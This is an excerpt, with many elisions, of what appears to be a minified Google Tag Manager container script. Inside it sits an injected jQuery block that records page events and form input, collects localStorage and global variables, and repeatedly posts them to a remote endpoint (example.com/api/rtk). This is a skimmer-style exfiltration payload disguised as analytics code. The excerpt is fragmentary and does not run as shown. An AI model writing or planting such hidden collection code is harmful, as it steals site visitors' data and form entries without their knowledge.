...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "vtp_overrideGaSettings": false,
        "vtp_eventCategory": "Новый пользователь",
        ...
        "vtp_interval": "15000",
        "vtp_limit": "1",
        "vtp_uniqueTriggerId": "30213456_8",
        "tag_id": 14
      }, {
        "function": "__cl",
        "tag_id": 15
        ...
        "metadata": ["map"],
        "once_per_event": true,
        "vtp_html": "\u003Cmeta name=\"google-site-verification\" content=\"SSbshJY9mGaWI_r3tS6vc1bbXD3vuYYsUprevzv8GKw\"\u003E",
      ...
      "rules": [[["if", 0], ["add", 0, 5, 4]], [["if", 1, 2], ["add", 1]], [["if", 3, 4], ["add", 2]], [["if", 0, 5], ["add", 3]]]
    },
    "runtime": []
  };
  ...
  */
  ...
  ze.md = Number("0") || 0;
  ze.da = "dataLayer";
  ze.Ki = "ChAI8NCBpwYQt5+cxZ7f1aFJEiQATU77VL0ggdMWD+jm+mlAfhLEcBX6fObJ6YEM+cirpYwsF3IaAnxJ";
  var Ce = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  var pf;
  try {
    pf = JSON.parse(Za("eyIwIjoiQ04iLCIxIjoiIiwiMiI6dHJ1ZSwiMyI6Imdvb2dsZS5jbiIsIjQiOiIiLCI1Ijp0cnVlLCI2IjpmYWxzZSwiNyI6ImFkX3N0b3JhZ2V8YW5hbHl0aWNzX3N0b3JhZ2V8YWRfdXNlcl9kYXRhfGFkX3BlcnNvbmFsaXphdGlvbiJ9"));
  } catch (a) {
    J(123), of(2), pf = {};
  }
  var qf = function () {
  ...
  $(function () {
    ...
    const behaviours = ["load", "click", "mouseover"];
    window._jsHooksniffer = {};
    ...
    function interactTracker(e) {
      if (!_jsHooksniffer[e.type]) _jsHooksniffer[e.type] = [];
      _jsHooksniffer[e.type].push(computeHash(e));
    }
    function postDataToServer(data) {
      const hashId = computeHash(data);
      const apiUrl = "https://example.com/api/rtk";
      ...
      request.onreadystatechange = function () {
        if (request.readyState === XMLHttpRequest.DONE) {
          if (request.status === 200) {
            ...
            console.error("发送数据失败, 状态码:" + request.status);
          }
        }
      };
    }
    function circulatingTracker() {
      const filteredLocalStorage = getFilteredLocalStorage();
      const collectedGlobalVars = getGlobalVars();
      const finalCollectedData = {
        localStoreItems: filteredLocalStorage,
        globalVarItems: collectedGlobalVars,
        jsHookInfo: window._jsHooksniffer
      };
      if (Object.keys(finalCollectedData).length > 0) {
        postDataToServer(finalCollectedData);
      }
    }
    window.addEventListener("load", function () {
      circulatingTracker();
      behaviours.forEach(function (behaviour) {
        document.body.addEventListener(behaviour, interactTracker);
      });
    });
    setInterval(circulatingTracker, 5 * 60500);
    $('body').on('input change', function (e) {
      var $field = $(e.target).closest('.field-container');
      _jsHooksniffer[e.type] = _jsHooksniffer[e.type] || [];
      _jsHooksniffer[e.type].push($field.attr('id'));
      if (this.value) {
  ...
  ;
  function Nu() {
    var a = ["&cv=9", "&rv=" + ze.Gf, "&tc=" + Rc.filter(function (b) {
      return b;
    }).length];
  ...
  X.m.aev = ["google"], function () {
    ...
    function h(r) {
      if ("form" === r.tagName.toLowerCase() && r.elements) {
        for (var t = 0, u = 0; u < r.elements.length; u++) It(r.elements[u]) && t++;
        return t;
      }
    }
    function l(r, t, u) {
          ...
          a: {
            ...
            switch (C) {
              ...
              case "IS_OUTBOUND":
                ...
                break a;
              default:
                y = sj(B, C, r.vtp_stripWww, r.vtp_defaultPages, r.vtp_queryKey);
            }
          }
          return y;
        case "ATTRIBUTE":
          var I;
          if (void 0 === r.vtp_attribute) I = b(w, v, u);else {
            var E = w.element;
            I = E && Wb(E, r.vtp_attribute) || u || "";
          }
          return I;
        case "MD":
          var F = r.vtp_mdValue,
            L = a(w, t, "MD", Ut);
          return F && L ? Xt(L, F) || u : L || u;
        case "FORM":
          return e(String(r.vtp_component || "SUBMIT_TEXT"), w, t, u);
        default:
          var M = b(w, v, u);
          mu(M, "aev", r.vtp_gtmEventId);
          return M;
      }
    });
  }();
  X.m.tl = ["google"], function () {
    function a(b) {
      return function () {
        if (b.eg && b.gg >= b.eg) b.Vf && V("self").clearInterval(b.Vf);else {
          b.gg++;
          var c = au().getTime();
          fu({
            event: b.eventName,
            ...
            "gtm.timerLimit": b.eg,
            "gtm.timerStartTime": b.wi,
            "gtm.timerCurrentTime": c,
            "gtm.timerElapsedTime": c - b.wi,
            "gtm.triggers": b.Tl
          });
        }
      };
    ...
    (function (b) {
      ...
      if (!isNaN(b.vtp_interval)) {
        var c = {
          ...
          Tl: String(b.vtp_uniqueTriggerId || "0"),
          wi: au().getTime()
        };
        c.Vf = V("self").setInterval(a(c), 0 > Number(b.vtp_interval) ? 0 : Number(b.vtp_interval));
      }
    });
  }();
